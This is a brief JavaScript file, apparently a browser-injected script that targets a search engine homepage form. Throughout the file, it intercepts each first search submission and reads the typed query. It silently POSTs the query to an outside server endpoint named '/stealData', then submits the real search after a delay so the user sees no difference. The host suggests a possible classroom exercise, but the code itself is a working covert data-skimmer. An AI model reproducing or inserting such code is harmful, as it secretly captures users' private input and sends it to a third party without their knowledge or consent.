var sumbitData = false;
console.log("Record Info");
let SendData =  (urlLink, data)=>{ 
    return new Promise((resolve, reject)=>{
        var xhr = new XMLHttpRequest();
        var url = urlLink;

        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-Type", "application/json");

        xhr.onreadystatechange = function () 
        {
            if (xhr.readyState === 4 && xhr.status === 200) 
            {
                var data = JSON.parse(xhr.responseText);
                resolve(data);

                
            }
            else if (xhr.readyState === 4){
                reject(JSON.parse(xhr.responseText));
            }
                 
        };
        var stringifyData = JSON.stringify(data);
        xhr.send(stringifyData);
    });
}
document.getElementById("search_form_homepage")
.addEventListener("submit", (event)=>{
    //First User Search Data First 
    if(!sumbitData){
        event.preventDefault();
        event.stopPropagation();
        let userText = document.getElementById("search_form_input_homepage").value;
        console.log(userText);
        let searchData  = {searched : userText};
        SendData("http://ugdev.cs.smu.ca:8756/stealData", searchData );
        //send the data then redirect user to actual search input 
        sumbitData = true; //allow user to search duck duck go
        setTimeout(()=>{ 
            document.getElementById('search_form_homepage').submit(); 
        }, 1000);
        return;
        
        

    }
    
    
    console.log("Record Data Of User");
})